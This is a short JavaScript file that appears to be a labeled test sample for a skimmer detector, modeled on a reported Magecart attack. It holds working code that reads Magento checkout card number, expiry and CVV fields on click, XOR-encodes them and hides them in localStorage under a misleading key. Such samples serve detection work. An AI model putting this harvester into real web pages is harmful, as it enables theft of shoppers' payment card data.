// expect: skimmer-field-harvest
// Modeled on Sansec, "Magecart skimmer turns Stripe into a malware command server" (2026): harvester
// reads Magento card fields on checkout click, XOR+hex encodes them and stashes them in localStorage.
var K = 'EXAMPLEKEYEXAMPLEKEY';
function x(s){var o='';for(var i=0;i<s.length;i++){o+=(s.charCodeAt(i)^K.charCodeAt(i%K.length)).toString(16).padStart(2,'0');}return o;}
var t = setInterval(function () {
  var b = document.querySelector('.action.primary.checkout:not(#top-cart-btn-checkout)');
  if (!b) return;
  clearInterval(t);
  b.addEventListener('click', function () {
    var v = function (s) { var e = document.querySelector(s); return e ? e.value : 'null'; };
    var n = v('input[autocomplete="cc-number"]'), m = v('[name="payment[cc_exp_month]"]'), y = v('[name="payment[cc_exp_year]"]'), c = v('input[name="payment[cc_cid]"]');
    if (n !== 'null' && m !== 'null' && y !== 'null' && c !== 'null') localStorage.setItem('cus_customer_id', x([n, m, y, c].join('|') + '|CP'));
  });
}, 1000);
